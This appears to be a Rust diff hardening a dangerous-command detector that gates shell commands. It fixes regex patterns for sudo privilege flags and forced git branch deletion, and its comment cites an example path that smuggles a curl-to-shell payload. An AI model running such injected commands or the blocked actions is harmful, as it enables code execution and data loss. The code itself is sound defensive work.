@@ -2,7 +2,7 @@ use regex::Regex;
 use std::sync::LazyLock;
 
 use super::normalize::{
-    command_detection_variants, command_parser_limit_exceeded, execution_flag_findings,
+    command_detection_variants_with_budget, command_parser_limit_exceeded, execution_flag_findings,
     normalize_command_for_detection,
 };
 
@@ -249,11 +249,11 @@ static PATTERNS: LazyLock<Vec<PatternRule>> = LazyLock::new(|| {
         ),
         (r"\bgit\s+branch\s+-D\b", "git branch force delete"),
         (
-            r"\bgit\s+branch\b[^;|&\\n]*?(?:-d\b|--delete\b)[^;|&\\n]*?(?:-f\b|--force\b)",
+            r"\bgit\s+branch\b[^;|&\n]*?(?:-d\b|--delete\b)[^;|&\n]*?(?:-f\b|--force\b)",
             "git branch force delete (long flags)",
         ),
         (
-            r"\bgit\s+branch\b[^;|&\\n]*?(?:-f\b|--force\b)[^;|&\\n]*?(?:-d\b|--delete\b)",
+            r"\bgit\s+branch\b[^;|&\n]*?(?:-f\b|--force\b)[^;|&\n]*?(?:-d\b|--delete\b)",
             "git branch force delete (long flags, force-first)",
         ),
         // chmod +x and run
@@ -263,11 +263,11 @@ static PATTERNS: LazyLock<Vec<PatternRule>> = LazyLock::new(|| {
         ),
         // sudo privilege flags
         (
-            r"\bsudo\b[^;|&\\n]*?\s+(?:-s\b|--st[a-z]*\b|-a\b|--a[a-z]*\b)",
+            r"\bsudo\b[^;|&\n]*?\s+(?:-s\b|--st[a-z]*\b|-a\b|--a[a-z]*\b)",
             "sudo with privilege flag (stdin/askpass/shell/list)",
         ),
         (
-            r"\bsudo\b[^;|&\\n]*?\s+-[a-z]*[sa][a-z]*\b",
+            r"\bsudo\b[^;|&\n]*?\s+-[a-z]*[sa][a-z]*\b",
             "sudo with combined-flag privilege escalation",
         ),
     ];
@@ -308,7 +308,24 @@ pub fn is_verification_artifact_cleanup(command: &str) -> bool {
         return false;
     }
     let target = parts[2];
+    // This exemption skips every dangerous-command check, so the target must be a plain path:
+    // any shell metacharacter, quote, expansion or non-ASCII byte could smuggle a payload
+    // (`/tmp/hermes-verify-a;curl${IFS}x|sh`), and `..` would escape the temp directory.
+    if !target
+        .bytes()
+        .all(|b| b.is_ascii_alphanumeric() || b"_./:@%+=,-".contains(&b))
+    {
+        return false;
+    }
     let path = std::path::Path::new(target);
+    if !path.components().all(|c| {
+        matches!(
+            c,
+            std::path::Component::RootDir | std::path::Component::Normal(_)
+        )
+    }) {
+        return false;
+    }
     let temp_dir = std::env::temp_dir();
     let filename = match path.file_name().and_then(|s| s.to_str()) {
         Some(f) => f,
@@ -334,7 +351,14 @@ pub fn detect_dangerous_command(command: &str) -> Option<DangerousFinding> {
         return None;
     }
 
-    for variant in command_detection_variants(command) {
+    let (variants, budget_exhausted) = command_detection_variants_with_budget(command);
+    if budget_exhausted {
+        return Some(DangerousFinding {
+            pattern_key: "command parser limit exceeded".to_string(),
+            description: "command parser limit exceeded".to_string(),
+        });
+    }
+    for variant in variants {
         if check_sql_delete_without_where(&variant) {
             return Some(DangerousFinding {
                 pattern_key: "SQL DELETE without WHERE".to_string(),
@@ -367,14 +391,29 @@ pub fn is_dangerous(command: &str) -> bool {
 }
 
 pub fn derive_pattern_key(command: &str) -> String {
-    if let Some(finding) = detect_dangerous_command(command) {
-        return finding.pattern_key;
-    }
     let normalized = normalize_command_for_detection(command);
-    let parts: Vec<&str> = normalized.split_whitespace().take(3).collect();
-    if parts.is_empty() {
+    let digest = || {
+        use sha2::{Digest, Sha256};
+        format!("{:x}", Sha256::digest(normalized.trim().as_bytes()))
+    };
+    if let Some(finding) = detect_dangerous_command(command) {
+        // Rule-based keys name a whole category on purpose. Findings that are not a named rule
+        // (interpreter / `sh -c` payloads, parser-limit hits) would otherwise turn one approval
+        // into a grant for every such command, so they are keyed on the exact command.
+        let named_rule = finding.pattern_key == "SQL DELETE without WHERE"
+            || PATTERNS
+                .iter()
+                .any(|rule| rule.description == finding.pattern_key);
+        if named_rule {
+            return finding.pattern_key;
+        }
+        return format!("{}:v1:{}", finding.pattern_key, digest());
+    }
+    // A non-dangerous command is only gated under an approve-everything policy; an "Always"
+    // grant must cover exactly that command, never a different one sharing its first words.
+    if normalized.trim().is_empty() {
         "command".to_string()
     } else {
-        parts.join(" ")
+        format!("command:v1:{}", digest())
     }
 }
